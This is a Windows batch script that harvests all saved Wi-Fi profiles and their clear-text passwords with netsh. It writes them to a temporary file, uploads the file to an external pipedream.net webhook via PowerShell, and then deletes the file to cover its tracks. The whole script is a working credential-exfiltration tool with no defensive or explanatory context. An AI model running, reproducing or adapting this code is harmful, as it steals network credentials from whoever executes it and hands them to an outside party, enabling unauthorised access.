@echo off
setlocal enabledelayedexpansion

set "WebhookURL=https://eo82pdqi0ie7vpl.m.pipedream.net"
set "ProfileDataFile=%TEMP%\profile_data.txt"

REM Step 1: Get device IP address (currently not working)
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4 Address"') do (
    set "IPAddress=%%a"
)

REM Step 2: Get a list of available WLAN profiles using PowerShell
for /F "delims=" %%i in ('powershell "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.ToString().Split(':')[1].Trim() }"') do (
    REM Step 3: Retrieve the profile data using netsh wlan show profile
    for /F "delims=" %%j in ('powershell "netsh wlan show profile '%%i' key=clear"') do (
        REM Append the profile data to the ProfileDataFile
        echo %%j>>"%ProfileDataFile%"
    )
)

REM Step 5: Send the data file to the webhook using PowerShell
powershell "Invoke-WebRequest -Uri '%WebhookURL%' -Method POST -InFile '%ProfileDataFile%'"

REM Clean up the temporary file
del "%ProfileDataFile%"

echo Data has been sent to the webhook.
